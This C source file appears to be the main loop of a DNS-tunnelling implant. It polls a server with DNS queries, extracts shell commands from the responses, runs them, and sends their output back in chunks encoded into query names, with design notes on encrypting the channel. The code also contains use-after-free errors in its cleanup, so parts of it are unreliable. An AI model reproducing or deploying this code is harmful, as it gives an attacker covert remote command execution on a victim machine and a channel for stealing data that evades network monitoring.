/*
 * main.c
 *
 *  Created on: Jan 17, 2016
 *      Author: joe
 */

#include <stdio.h>
#include <string.h> 	  	// strlen used in main here

#include "dns-protocol.h" 	// for using createDnsHeader here..
#include "bufferHelper.h"
#include "exec.h"
#include "sockets.h"
#include "dns-packet.h"
#include "linked-list.h"	// list definitions and structs

/*
 * discussion points for "heavy weight" vs. "light weight" implementations
 * of 'dns-client' while ensuring reliability and error detection and recovery.
 *
 * <1>
 * rfcQueryNameCreation - only necessary when domain names are not included
 * into program, one exception would be if the server sent a message that
 * contained a new domain to talk to, either this response would have to be
 * dns compliant, or we would have to leave in rfcQueryNameCreation.
 * </>
 *
 *
 * <2>
 * The main string parsing is really just appending the stdout bytes to
 * the "host" portion of the qname. The header would already be built,
 * ! static transaction id? ! --
 *
 * To recap, string operations on queries = appending stdout bytes, possibly
 * randomize transaction id, encoding query name, and possibly encrypting that
 * query name.
 *
 * String operations on query responses = Interpreting pre-selected fields
 * of the response, but typically just the query name portion after decoding
 * and optionally decrypting it.
 *
 * To retrieve response query name, implement light weight qname parser. *
 * </>
 *
 * <3>
 * To do, perl/python library for creating c code and a small but efficient
 * build/automation process..
 * <>
 *
 *
 * <4>
 * Go through error parsing handlers, perror vs manual? to return or not..
 * </>
 *
 * <5>
 * Regarding #1, do not use putChar/bufferhelper functions.. prebuilt strings?
 * </>
 *
 * <6> // scary
 * linked list implemented as a queue of jobs
 *
 */

// globals

unsigned char firstQuery[] = {
0x8c, 0x80, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
0x02, 0x68, 0x69, 0x03, 0x63, 0x6f, 0x6d, 0x00,
0x00, 0x01, 0x00, 0x01 };

// to modify the contents of a variable,
// you need to pass the address of it,

// if the variable is of type pointer to {data-type}
// you simple pass the address of this variable to modify it.

// when doing the above with functions, you have to have correct function
// signatures
// variable = pointer
// passing address of variable = passing address of variable whos contents = address
// aka passing a pointer to a "pointer"

// test data
unsigned char *domain = ".com.";
unsigned char *host   = "initial";
unsigned int napTime = 10;
unsigned int isJobInProgress = 0;

void main(int argc, char *argv[])
{
	int stdoutBuffSize = 0, recvBuffSize = 0, sendBuffSize = 0, taskType = 0;
	unsigned char *recvBuff, *sendBuff, *stdoutBuff, *task;
	recvBuff = NULL;
	sendBuff = NULL;
	stdoutBuff = NULL;
	task = NULL;

	// create two linked list based queues
	struct NODE *taskQueueHead = NULL;
	struct NODE *stdoutListHead = NULL;

	// argv1 - "host portion"
	// argv2 - "domain"

	// send initial query and receive response
	// encrypt, encode, createPacket, sendPacket
	sendBuff = createDnsQueryPacket(host, domain, &sendBuffSize);
	recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);

	// create dns packet buffer
	while (1)
	{
		puts ("about to parse packet \n");

		// parse response
		struct DNS_RESPONSE_PACKET *drp = parseDnsResponse(recvBuff, recvBuffSize);

		// disect pre-selected fields based on protocol we designed
		struct CONTROL *ctrl = getControl(drp);

		printControlFields(ctrl);

		// decide what to do with response
		switch (ctrl->messageType)
		{
			case MESSAGE_TYPE_NO_CMD: puts("case => MESSAGE_TYPE_NO_CMD");
				// sleep, grab next stdout chunk, send query
				break;

			case MESSAGE_TYPE_SHELL_CMD: puts("case => MESSAGE_TYPE_SHELL_CMD");
				// add shell command to task queue
				enqueue(&taskQueueHead, ctrl->message, ctrl->messsageLength);
				break;

			default: puts("case => default");
				break;
		} // end switch

		// check taskQueue
		struct NODE *nextJob = dequeue(&taskQueueHead);
		printf("nextJob: %p \n", nextJob);

		if(nextJob != NULL) // tasks exist
		{
			puts("nextJob != NULL");

			isJobInProgress = 1;
			printf("next job -> %s \n", nextJob->data);

			// run job
			stdoutBuffSize = shellCommand(nextJob->data, &stdoutBuff);
			stdoutListHead = constructStdoutList(stdoutBuff, stdoutBuffSize);

			// fetch a stdout "chunk" "node" and send
			struct NODE *chunk = dequeue(&stdoutListHead);
			sendBuff = createDnsQueryPacket(chunk->data, domain, &sendBuffSize);
			recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
		}
		// else no tasks in queue.. query again
		sendBuff = createDnsQueryPacket("waiting", domain, &sendBuffSize);
		sleep(napTime);
		recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);

		// free malloc'd pointers
		puts("free()'ing ");
		if(drp!=NULL)
			free(drp);

		if(drp->dnsQuestion.qname!=NULL)
			free(drp->dnsQuestion.qname);

		if(ctrl!=NULL)
			free(ctrl);

		if(ctrl->message!=NULL)
			free(ctrl->message);

	} // end while

	/*
	if (stdoutListHead != NULL)
		free(stdoutListHead);

	if(taskQueueHead != NULL)
		free(taskQueueHead);

	if (stdoutBuff != NULL)
		free(stdoutBuff);

	if (sendBuff != NULL)
		free(sendBuff);

	if (recvBuff != NULL)
		free(recvBuff);
	*/
}
